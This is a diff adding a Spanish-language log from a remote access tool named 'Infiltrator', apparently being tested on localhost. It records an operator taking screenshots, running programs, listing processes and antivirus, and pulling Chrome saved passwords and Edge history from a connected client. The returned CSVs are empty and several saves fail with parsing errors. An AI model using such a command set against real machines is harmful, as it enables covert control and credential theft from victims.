@@ -1,0 +1,43 @@
+-----------------------------------------------
+------ Welcome to Infiltrator Log System ------
+-----------------------------------------------
+[2025-03-28 21:17:29.131] - [INFO]: Configuración del servidor cargada correctamente.
+[2025-03-28 21:17:31.141] - [INFO]: Servidor Infiltrator iniciado en 127.0.0.1:443
+[2025-03-28 21:17:34.423] - [INFO]: Cliente 1 conectado.
+[2025-03-28 21:17:37.767] - [INFO]: Cliente 1 desconectado.
+[2025-03-28 21:17:51.079] - [INFO]: Cliente 2 conectado.
+[2025-03-28 21:17:58.181] - [INFO]: Cliente 2 desconectado.
+[2025-03-28 21:18:43.704] - [INFO]: Cliente 3 conectado.
+[2025-03-28 21:18:50.849] - [INFO]: Comando introducido: 3 system_info
+[2025-03-28 21:19:01.089] - [INFO]: Comando introducido: 3 screenshot
+[2025-03-28 21:19:01.244] - [INFO]: Recibiendo archivo infiltrator-20250328-211901-screenshot.png
+[2025-03-28 21:19:01.645] - [INFO]: Archivo 'infiltrator-20250328-211901-screenshot.png' recibido y guardado correctamente.
+[2025-03-28 21:19:39.583] - [INFO]: Comando introducido: help
+[2025-03-28 21:19:46.581] - [INFO]: Comando introducido: 3 antivirus
+[2025-03-28 21:19:52.157] - [INFO]: Comando introducido: 3 network_info
+[2025-03-28 21:20:06.781] - [INFO]: Comando introducido: 3 exec calc.exe
+[2025-03-28 21:20:14.564] - [INFO]: Comando introducido: 3 exec chrome.exe
+[2025-03-28 21:20:25.899] - [INFO]: Comando introducido: 3 list_processes
+[2025-03-28 21:20:47.813] - [INFO]: Comando introducido: 3 exec explorer.exe
+[2025-03-28 21:21:05.673] - [INFO]: Comando introducido: help
+[2025-03-28 21:21:13.086] - [INFO]: Comando introducido: browsers_module
+[2025-03-28 21:21:27.457] - [INFO]: Comando introducido: 3 chrome_passwords
+[2025-03-28 21:21:27.593] - [INFO]: Recibiendo archivo chrome_passwords.csv
+﻿index,url,username,password
+FILE_END
+[2025-03-28 21:21:46.796] - [INFO]: Comando introducido: 3 edge_history
+[2025-03-28 21:21:46.868] - [ERROR]: Error al guardar el archivo 'chrome_passwords.csv
+﻿index,url,username,password
+FILE_END': El nombre de archivo, el nombre de directorio o la sintaxis de la etiqueta del volumen no son correctos. : 'C:\Users\dextg\Desktop\Infiltrator-Project\ConsoleApp1\bin\Debug\net8.0\chrome_passwords.csv
+﻿index,url,username,password
+FILE_END'
+[2025-03-28 21:22:17.221] - [INFO]: Comando introducido: 3 edge_history
+[2025-03-28 21:22:17.316] - [INFO]: Recibiendo archivo edge_history.csv
+﻿index,url,title,last_visit_time
+FILE_END
+[2025-03-28 21:22:22.502] - [INFO]: Comando introducido: 3 edge_history
+[2025-03-28 21:22:22.568] - [ERROR]: Error al guardar el archivo 'edge_history.csv
+﻿index,url,title,last_visit_time
+FILE_END': El nombre de archivo, el nombre de directorio o la sintaxis de la etiqueta del volumen no son correctos. : 'C:\Users\dextg\Desktop\Infiltrator-Project\ConsoleApp1\bin\Debug\net8.0\edge_history.csv
+﻿index,url,title,last_visit_time
+FILE_END'
